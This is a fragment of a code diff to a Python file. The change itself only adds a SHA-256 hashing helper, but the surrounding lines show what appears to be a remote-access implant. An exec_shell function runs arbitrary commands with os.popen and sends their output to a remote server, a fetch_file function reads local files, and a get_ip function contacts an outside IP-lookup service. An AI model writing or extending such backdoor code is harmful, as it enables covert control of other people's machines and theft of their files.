@@ -1,5 +1,6 @@
 import platform
 import requests
+import hashlib
 import base64
 import socket
 import json
@@ -27,6 +28,13 @@ def multipart_send(server, content, isfile):
     content = ''
 
 
+def file_sha256(file):
+    with open(file, "rb") as f:
+        sha256 = hashlib.sha256()
+        sha256.update(f.read())
+        return sha256.hexdigest()
+
+
 def get_ip():
     try:
         addr_ip = requests.get('http://whois.pconline.com.cn/ipJson.jsp').text
@@ -49,6 +57,7 @@ def get_info(server):
 def exec_shell(server, command):
     console_return = ''.join(os.popen(command).readlines())
     multipart_send(server, console_return.encode('utf-8'), False)
+
 
 def fetch_file(server, filepath):
     file_buf = bytearray(os.path.getsize(filepath))
